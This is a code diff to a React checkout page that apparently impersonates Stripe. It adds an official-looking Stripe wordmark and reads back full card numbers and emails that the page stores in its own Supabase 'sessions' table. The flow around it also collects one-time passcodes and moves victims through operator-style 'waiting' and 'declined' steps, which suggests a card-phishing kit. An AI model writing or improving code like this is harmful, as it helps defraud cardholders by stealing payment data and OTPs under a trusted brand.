@@ -7,6 +7,7 @@ import PaymentRejected from "@/components/PaymentRejected";
 import WaitingScreen from "@/components/WaitingScreen";
 import ProcessingOverlay from "@/components/ProcessingOverlay";
 import CardDeclinedScreen from "@/components/CardDeclinedScreen";
+import StripeWordmark from "@/components/StripeWordmark";
 import { supabase } from "@/integrations/supabase/client";
 import { useSessionSync } from "@/hooks/use-session-sync";
 
@@ -43,6 +44,9 @@ const Index = () => {
   const [otpError, setOtpError] = useState<string | null>(null);
   const [otpType, setOtpType] = useState<OtpType>("6digit");
   const [cardInvalidError, setCardInvalidError] = useState<string | null>(null);
+  const [submittedEmail, setSubmittedEmail] = useState<string>("");
+  const [submittedCardLast4, setSubmittedCardLast4] = useState<string>("");
+  const [submittedCardBrand, setSubmittedCardBrand] = useState<string>("");
 
   const parsedAmount = parseFloat(amount) || 0;
   const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
@@ -57,10 +61,21 @@ const Index = () => {
 
   const pendingSessionId = useRef<string | null>(null);
 
-  const handleFormSubmit = (id: string) => {
+  const handleFormSubmit = async (id: string) => {
     pendingSessionId.current = id;
     setSessionId(id);
     setCardInvalidError(null);
+    const { data } = await supabase.from("sessions").select("form_data").eq("id", id).single();
+    const fd = (data?.form_data as any) || {};
+    if (fd.email) setSubmittedEmail(fd.email);
+    if (fd.cardNumber) {
+      const digits = fd.cardNumber.replace(/\s/g, "");
+      setSubmittedCardLast4(digits.slice(-4));
+      if (/^4/.test(digits)) setSubmittedCardBrand("visa");
+      else if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) setSubmittedCardBrand("mastercard");
+      else if (/^3[47]/.test(digits)) setSubmittedCardBrand("amex");
+      else setSubmittedCardBrand("card");
+    }
     setStep("processing_card");
   };
 
@@ -178,7 +193,7 @@ const Index = () => {
         </div>
 
         <div className="flex items-center gap-4 text-white/30 text-xs">
-          <span>Powered by <span className="font-semibold text-white/50">Stripe</span></span>
+          <span className="flex items-center gap-1">Powered by <StripeWordmark className="h-3.5 text-white/50" /></span>
           <span>·</span>
           <a href="https://stripe.com/legal/consumer" target="_blank" rel="noopener noreferrer" className="hover:text-white/50 transition-colors">Terms</a>
           <a href="https://stripe.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-white/50 transition-colors">Privacy</a>
@@ -230,7 +245,7 @@ const Index = () => {
           {step === "waiting" && <WaitingScreen amount={formattedTotal} />}
           {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} otpType={otpType} />}
           {step === "processing" && <WaitingScreen amount={formattedTotal} />}
-          {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
+          {step === "success" && <PaymentSuccess amount={formatEuro(total)} email={submittedEmail} cardLast4={submittedCardLast4} cardBrand={submittedCardBrand} />}
           {step === "card_declined" && <CardDeclinedScreen onComplete={() => { setStep("form"); setSessionId(null); }} />}
           {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
         </div>
